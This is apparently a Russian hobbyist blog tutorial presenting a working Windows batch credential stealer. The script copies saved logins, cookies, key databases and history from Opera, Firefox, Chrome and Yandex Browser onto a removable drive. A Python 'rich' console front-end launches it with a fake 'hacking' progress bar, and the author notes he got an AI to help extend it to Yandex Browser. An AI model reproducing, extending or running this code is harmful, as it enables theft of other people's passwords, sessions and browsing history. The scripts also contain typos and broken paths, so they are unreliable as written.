Детские шалости

Я собираюсь написать программу, которая взламывает сохроненные пароли и историю браузера. Я вспомнил как шалил в 7 классе с помощью батника: “Самодельный безвредный стилер” от overbafer1.

@echo off
md %~d0\Mozilla
md %~d0\Opera
md %~d0\Google
CD/D %APPDATA%\Opera\Opera\
copy /y wand.dat %~d0\Opera\
copy /y cookies.dat %~d0\Opera\
cd %AppData%\Mozilla\Firefox\Profiles\.default
copy /y cookies.sqlite %~d0\Mozilla
copy /y key3.db %~d0\Mozilla
copy /y signons.sqlite %~d0\Mozilla
copy /y AppData%\Mozilla\Firefox\Profiles\.default %~d0\Mozilla
cd %localappdata%\Google\Chrome\User Data\Default
copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"
ATTRIB -R -A -S -H
attrib +h %~d0\Mozilla
attrib +h %~d0\Opeara
attrib +h %~d0\Google

Далее я поговорил с искуственным интелектом, чтобы он мне хакнул пароли Яндекс Браузера

cd %localappdata%\Yandex\YandexBrowser\User data\Default
copy /y "%localappdata%\Yandex\YandexBrowser\User Data\Default\Login Data" "%~d0\Yandex"

Далее я захотел получить не только пароли, но и историю, в 7 классе я просто дописывал:

copy /y "%localappdata%\Google\Chrome\User Data\Default\History" "%~d0\Google"

После строки:

copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"

Думаю для Яндекс Браузера будет так:

copy /y "%localappdata%\Yandex\YandexBrowser\User Data\Default\History" "%~d0\Yandex"

Чтобы в этом убедиться я скачал Яндекс браузер, и вот такой батник у нас получился:

@echo off
md %~d0\Mozilla
md %~d0\Opera
md %~d0\Google
md %~d0\Yandex
CD/D %APPDATA%\Opera\Opera\
copy /y wand.dat %~d0\Opera\
copy /y cookies.dat %~d0\Opera\
cd %AppData%\Opera Software\Opera Stable
copy /y Login Data %~d0\Opera\
copy /y History %~d0\Opera\
cd %AppData%\Mozilla\Firefox\Profiles\.default
copy /y cookies.sqlite %~d0\Mozilla
copy /y key3.db %~d0\Mozilla
copy /y signons.sqlite %~d0\Mozilla
copy /y AppData%\Mozilla\Firefox\Profiles\.default %~d0\Mozilla
cd %localappdata%\Google\Chrome\User Data\Default
copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"
copy /y "%localappdata%\Google\Chrome\User Data\Default\History" "%~d0\Google"
cd %localappdata%\Yandex\YandexBrowser\User data\Default
copy /y "%localappdata%\Yandex\YandexBrowser\User Data\Default\Login Data" "%~d0\Yandex"

exit

Я изменил код, добавил свою версию взлома Оперы, думаю она правильная, но способ от overbafer1 тоже оставил, еще я добавил взлом истории браузера.

Так же удалил “attrib” ведь мне не надо, чтобы папки скрылись, не вижу в этом смысл, разве что если ты это делаешь при хозяине этого компьютера, но я собираюсь сделать паливную прогу с топовым интерфейсом, чтобы только ты видел, что просиходит.

Далее я начал работать над консольным интерфейсом нашей программы написанной на питоне, яиспользую библиотеку rich, если у вас ее нет, вы можете ее установить командой pip:

pip install rich

Потом я написал такой код на python:

import subprocess
import time
from rich.console import Console
from rich import print
from rich.panel import Panel
from rich.progress import track

print(Panel("""
	[green]Прога может взламывать пароли и историю браузеров:
		1. [red]Opera[/red]
		2. [yellow]Firefox[/yellow]
		3. [blue]Google Chrome[/blue]
		4. [red]Y[white]andex Browser[/white]""", title="Добро пожаловать в Детские Шалости"))

subprocess.call("start hack.bat", shell=True)

for i in track(range(100), description="Идет взлом..."):
	time.sleep(0.5)

Вместо “hack” вы можете написать свое имя батника. После взлома замените историю и пароли браузера.
